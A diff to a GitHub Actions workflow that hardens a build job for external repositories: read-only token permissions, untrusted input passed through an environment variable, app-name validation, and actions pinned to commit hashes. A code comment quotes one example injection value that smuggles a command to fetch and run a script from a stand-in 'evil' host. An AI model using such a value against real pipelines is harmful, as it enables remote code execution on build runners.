@@ -50,6 +50,12 @@ concurrency:
   group: build-external-${{ inputs.repo_url }}-${{ inputs.ref }}
   cancel-in-progress: true
 
+# Nothing here needs write from GITHUB_TOKEN: publishing uses the SWR secrets, and
+# the CWL POST is done locally by the CLI. Keep the token read-only to limit blast
+# radius if a step/action is compromised (it still cannot pass the main ruleset).
+permissions:
+  contents: read
+
 jobs:
   setup:
     runs-on: ubuntu-24.04
@@ -59,8 +65,12 @@ jobs:
     steps:
       - name: Parse repo URL
         id: parse
+        # repo_url is an untrusted dispatch input: read it from env and reference
+        # $URL, never inline ${{ }} in the shell, so a value like x";curl evil|sh;"
+        # cannot be substituted into the script before sh runs.
+        env:
+          URL: ${{ inputs.repo_url }}
         run: |
-          URL="${{ inputs.repo_url }}"
           case "$URL" in
             https://github.com/*) : ;;
             *) echo "::error::repo_url must be https://github.com/<owner>/<repo>"; exit 1 ;;
@@ -72,8 +82,23 @@ jobs:
             */*) : ;;
             *) echo "::error::repo_url is not <owner>/<repo>"; exit 1 ;;
           esac
+          # Owner-scoped app name so owner/foo and otheruser/foo do not collide on
+          # the shared :latest tag. Lowercased because registry repository names
+          # must be lowercase (Docker rejects uppercase refs).
+          OWNER="${SLUG%%/*}"
+          NAME="${SLUG##*/}"
+          APP_NAME="$(printf '%s' "${OWNER}-${NAME}" | tr '[:upper:]' '[:lower:]')"
+          # Reject anything outside the lowercase registry-path charset (defence in
+          # depth on top of the env-var pattern above).
+          case "$APP_NAME" in
+            [a-z0-9]*) : ;;
+            *) echo "::error::app name must start with a lowercase alphanumeric"; exit 1 ;;
+          esac
+          case "$APP_NAME" in
+            *[!a-z0-9._-]*) echo "::error::app name has invalid characters"; exit 1 ;;
+          esac
           echo "slug=$SLUG" >> "$GITHUB_OUTPUT"
-          echo "app_name=${SLUG##*/}" >> "$GITHUB_OUTPUT"
+          echo "app_name=$APP_NAME" >> "$GITHUB_OUTPUT"
 
   check_bypass_authorized:
     # Only evaluated when a bypass is requested. Matches the triggering actor
@@ -154,7 +179,7 @@ jobs:
     runs-on: ubuntu-24.04
     steps:
       - name: Checkout external repo
-        uses: actions/checkout@v7.0.1
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           repository: ${{ needs.setup.outputs.slug }}
           ref: ${{ inputs.ref }}
@@ -175,7 +200,7 @@ jobs:
           echo "cwl_path=$CWL" >> "$GITHUB_ENV"
 
       - name: Upload CWL artifact
-        uses: actions/upload-artifact@v7.0.1
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
         with:
           name: cwl
           path: ${{ env.cwl_path }}
